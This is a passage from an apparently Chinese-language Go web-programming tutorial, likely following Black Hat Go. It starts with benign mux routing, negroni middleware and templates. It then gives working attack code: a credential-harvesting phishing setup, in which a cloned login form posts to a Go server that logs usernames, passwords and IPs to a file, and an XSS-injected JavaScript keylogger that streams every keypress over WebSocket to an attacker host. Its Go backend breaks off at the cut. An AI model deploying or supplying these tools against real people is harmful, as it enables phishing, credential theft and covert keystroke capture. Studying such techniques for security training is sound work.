mux.NewRounter()</span><br></pre></td></tr></table></figure><p>返回的类型接口实现了<code>http.Handler</code>，但同时也具有许多其他关联的方法。其中，最长用的方法是：<code>HandleFunc()</code>，如果想定义新的路由来对<code>/foo</code>模式的<code>Get</code>请求，则可以使用如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/foo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>由于调用了<code>Method()</code>，因此，只有<code>Get</code>请求才能匹配此路由。所有其他方法将返回404请求。可以在此之上链接其他限定符，例如，与特定主机头值匹配的<code>Host()</code>。以下内容仅返回与主机头设置为<code>www.foo1.com</code>的请求匹配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.HandleFunc(<span class="string">&quot;/foo1&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo1&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>).Host(<span class="string">&quot;www.foo1.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>有时，在请求路径中匹配并传递参数会很有帮助。<code>gorilla/mux</code>很适合。</p><p>打印出请求路径在<code>user</code>之后的所有内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>在定义请求路径时，可以使用花括号定义请求参数。可以将此视为已经命名的占位符。然后再函数中调用<code>mux.Var()</code>，将请求对象传递给它。此时会返回<code>map [string]string</code></p><p>此外还可以使用正则表达式来限定传递的模式。例如，指定user的参数必须为小写字母</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user:[a-z]+&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>完整的代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/foo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/foo1&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo1&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>).Host(<span class="string">&quot;www.foo1.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user:[a-z]+&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br><span class="line"></span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-使用negroni包构建中间件"><a href="#5-使用negroni包构建中间件" class="headerlink" title="5. 使用negroni包构建中间件"></a>5. 使用<code>negroni</code>包构建中间件</h3><p>我们之前的中间件，记录了有关请求处理的开始和结束时间，并且返回了响应。再很多情况下，中间件其实不必对每个传入的请求都进行操作。使用中间件的原因由很多，其中包括记录请求，对用户身份验证和授权以及映射资源。</p><p>例如可以编写用于执行基本身份认证的中间件，它可以为每个请求解析一个授权标头，验证所提供的用户名和密码。如果凭证是无效的，则返回401响应。我们还可以将多个中间件函数链接再一起，从而能执行完一个中间件后执行下一个中间件。</p><p>此前创建的日志记录中间件仅包装类了一个函数，实际上，并没有什么作用。因为一般都是链式调用</p><p>接下来使用成熟的包<code>negroni</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/urfave/negroni</span><br></pre></td></tr></table></figure><p>然后进行一个简单的使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/urfave/negroni&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">n := negroni.Classic()</span><br><span class="line">n.UseHandler(r)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中  <code>negroni.Classic()</code>创建了一个指向<code>Negroni</code>实例的新指针。</p><blockquote><p>要创建新指针由很多种方法</p><p>negroni.Classic()或者 negroni.New()</p><p>但是 negronic.Classic()使用默认的中间件，包括请求记录器，再默认的情况下拦截和恢复的中间件，以及服务于同一个目录的公共文件夹的中间件，函数<code>nehgroni.New()</code>不会创建任何默认的中间件</p><p>同时，<code>negroni.Use(NewRecovery())</code>可以用来使用恢复包</p></blockquote><p>接下来通过<code>n.UseHandler(r)</code>将路由器添加到中间件堆栈。在继续设计的时候，要考虑执行顺序。</p><p>例如：我们希望身份验证检查中间件需要在身份验证的处理函数之前运行。在路由器之前添加的任何中间件都将在处理函数运行前执行。路由之后添加的任何中间件都将在处理函数之后执行。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302222010.png"></p><blockquote><p>发出 web请求后， negorni 将中间件信息打印到标准输出，</p></blockquote><p>默认的插件固然好用，但我们需要进行一个包装</p><p>首先输出一条消息，并将执行传递给下一个中间件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> trival <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t * trival)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request,next http.HandlerFunc) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Executing trival middleware&quot;</span>)</span><br><span class="line">next(w,r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重写了<code>ServeHTTP</code>的方法，加了一个 http.HandlerFunc 的参数，用来指向下一个中间件函数。</p><p>调用了 next 传递参数，实现在中间件链上的转移。</p><blockquote><p>个人感觉，这种方式有些类似于链表</p></blockquote><p>不过，需要告诉<code>negroni</code>包要将上述实现作为中间件链的部分，为此，可以调用<code>nergoni</code>的<code>Use</code>方法，并将接口<code>nergroni.Handler</code>实现的实例类传递给该方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n.Use(&amp;trival&#123;&#125;)</span><br></pre></td></tr></table></figure><p>虽然使用该方法编写中间件非常方便，但是，该方法也有一个弊端。无论编写什么方法都需要使用<code>negroni</code>包。</p><p>例如，我们正在写一个将安全标头写入响应的中间件包，希望它可以实现<code>Http.Handler</code>，这样就可以在其他应用程序中使用该接口，因为绝大多数程序栈似乎都不太欢迎接口<code>negroni.Handler</code></p><p>初次之外，还有两种方法让<code>negroni</code>包使用我们的中间件。其中一种就是<code>UseHadnler(handler http.Handler)</code></p><p>第二种方法是，调用<code>UseHandlerFunc(HandlerFunc func(w http.ResponseWriter,r * http.Request))</code></p><p>后者不太常用，因为它不允许放弃执行链中的下一个中间件。例如，一个中间件是用于执行身份验证的，如有无效凭证或者会话信息，则会返回401响应，并且停止运行。那么，第二种就完全不适合。</p><h3 id="6-使用negroni包添加身份认证"><a href="#6-使用negroni包添加身份认证" class="headerlink" title="6. 使用negroni包添加身份认证"></a>6. 使用negroni包添加身份认证</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/urfave/negroni&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> badAuth <span class="keyword">struct</span> &#123;</span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *badAuth)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request,next http.HandlerFunc) &#123;</span><br><span class="line">username := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">password := r.URL.Query().Get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> username != b.Username || password != b.Password  &#123;</span><br><span class="line">http.Error(w,<span class="string">&quot;Unauthorized&quot;</span>,<span class="number">401</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ctx := context.WithValue(r.Context(),<span class="string">&quot;username&quot;</span>,username)</span><br><span class="line">r = r.WithContext(ctx)</span><br><span class="line">next(w,r)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">username := r.Context().Value(<span class="string">&quot;username&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi %s\n&quot;</span>, username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/hello&quot;</span>,hello).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">n := negroni.Classic()</span><br><span class="line">n.Use(&amp;badAuth&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">n.UseHandler(r)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加入了<code>badAuth</code>，该中间件将仅用于模拟身份验证。该中间件有两个字段，<code>Username</code>和<code>Password</code>，并且实现了接口<code>negroni.Handler</code>，因为它定义了包含三个参数的<code>ServeHTTP()</code>方法，在该方法中，首先获取用户名和密码，然后与我们拥有的字段进行比较，如果用户名密码不正确，将发送401状态码。</p><p>如果凭证正确，我们需要将用户名添加到请求上下文中。调用<code>context.WithValue()</code>从请求中初始化上下文，在该上下文中设置一个<code>username</code>的变量。然后，可以调用<code>r.WithContext(ctx)</code>来确保进行新的上下文。</p><p>在函数<code>hello()</code>中，可以使用函数<code>Context().Value(interface&#123;&#125;)</code>，从请求上下文中获取用户名，该函数本身返回一个<code>interface()</code>。因为他是一个字符串，所以可以直接使用断言。</p><h3 id="7-使用模板生成HTML响应"><a href="#7-使用模板生成HTML响应" class="headerlink" title="7. 使用模板生成HTML响应"></a>7. 使用模板生成HTML响应</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    Hello &#123;&#123;.&#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">t, err := template.New(<span class="string">&quot;hello&quot;</span>).Parse(x)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">t.Execute(os.Stdout, <span class="string">&quot;&lt;script&gt;alert(&#x27;world&#x27;)&lt;/script&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个<code>x</code>变量，储存模板，在模板内部，可以使用NaN 约定定义占位符，可以是一个结构体，也可以是一个基本数据类型。在这里，使用单个<code>.</code>，告诉程序包，要在此处，渲染整个上下文。，如果我们要将<code>Username</code>内容床欸模板，我们只需要，<code>&#123;&#123;.Username&#125;&#125;</code>渲染该字段。</p><p>接下来创建一个模板，然后进行解析，最后返回一个<code>Template</code>的指针。</p><blockquote><p>panic 可以用作处理错误</p></blockquote><p>最后使用<code>Execute(io.Writer,interface&#123;&#125;)</code>，然后将模板传递给第二个变量，，这里使用<code>os.Execute()</code>生成了HTML</p><h2 id="0X01凭证收割"><a href="#0X01凭证收割" class="headerlink" title="0X01凭证收割"></a>0X01凭证收割</h2><p>社会工程学的主要内容之一是：凭证收割攻击。这种类型的攻击通过诱使用户在原始网站的复制版本中输入凭证来捕获用户的登录信息。</p><p>拥有用户的凭证之后，就可以在他们实际的站点上进行登录，这通常是突破组织边界的入口。</p><p>我们首先需要<code>copy</code>一份网站源码，地址在这：</p><p><a href="https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester/public">https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester/public</a></p><p>将<code>index.html</code>中的这段内容，修改为如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8080/login&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们开始使用 <code>python -m hpp.server</code> 开一个http服务</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303224017.png"></p><p>然后我们编写接受端的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">log.WithFields(log.Fields&#123;</span><br><span class="line"><span class="string">&quot;time&quot;</span>:       time.Now().String(),</span><br><span class="line"><span class="string">&quot;username&quot;</span>:   r.FormValue(<span class="string">&quot;_user&quot;</span>),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:   r.FormValue(<span class="string">&quot;_pass&quot;</span>),</span><br><span class="line"><span class="string">&quot;user-agent&quot;</span>: r.UserAgent(),</span><br><span class="line"><span class="string">&quot;ip_address&quot;</span>: r.RemoteAddr,</span><br><span class="line">&#125;).Info(<span class="string">&quot;login attempt&quot;</span>)</span><br><span class="line">http.Redirect(w, r, <span class="string">&quot;/&quot;</span>, <span class="number">302</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fh, err := os.OpenFile(<span class="string">&quot;credentials.txt&quot;</span>, os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0600</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">log.SetOutput(fh)</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/login&quot;</span>, login).Methods(<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">r.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.FileServer(http.Dir(<span class="string">&quot;public&quot;</span>)))<span class="comment">//提供静态文件</span></span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先，我们需要导入包<code>github.com/Sirupsen/logrus</code>，这是我们希望使用结构化日志的记录包。</p><p>我们首先定义了函数<code>login</code>，使用<code>log.WithFields()</code>，写出捕获的数据。显示，时间，用户名和密码，用户代理和请求的IP地址。然后通过调用<code>FormValues(string)</code>来获取这些元素。需要与表单中存在的名字相对应。之后重定向到根目录。</p><p>在main函数中，0600 指的是创建新文件，创建文件之后，使用<code>log.SetOutput()</code>将句柄传递给他，以配置日志记录包并将其写入该文件。接下来，还需要告诉路由器从一个目录中提供静态文件。</p><p>开启的文件夹再以另一份形式放在代码的根目录下，之后当我们运行代码后，访问伪造的80端口，会将信息发储存在txt中，并且重定向到正确的8080端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303224108.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303230309.png"></p><h2 id="0x02-使用-websocket-API实现按键记录"><a href="#0x02-使用-websocket-API实现按键记录" class="headerlink" title="0x02 使用 websocket API实现按键记录"></a>0x02 使用 websocket API实现按键记录</h2><p>近年来，全双工通信协议(websocket API)日益流行，许多浏览器开始支持他，他为web应用服务器和客户端之间的有效通信提供了一些方法。最重要的是，他允许服务器无需轮询就可以将消息发送到客户端</p><p>websocket对于构建诸如聊天游戏等实时应用程序比较有用。但我们也有其他用处，例如，将键盘记录程序注入，捕获用户按下的每个键。当我们可以进行xss攻击以后，我们可以包含一个<code>javascript</code>文件，以处理来自客户端<code>websocket</code>响应。</p><p>我们使用<code>JS Bin</code>(<a href="http://jsbin.com)来进行测试`payload`,代码如下/">http://jsbin.com)来进行测试`payload`，代码如下</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8080/k.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;/login&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>= <span class="string">&#x27;username&#x27;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>= <span class="string">&#x27;password&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们打开页面的时候，会提示创建了连接</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114813.png"></p><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114719.png"></p><p>当我们再打开的html页面键入的时候，会自动捕捉</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114915.png"></p><p>先定义一个js模板，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://&#123;&#123;.&#125;&#125;/ws&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">        s = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(evt.<span class="property">which</span>);</span><br><span class="line">        conn.<span class="title function_">send</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p> 后端代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span 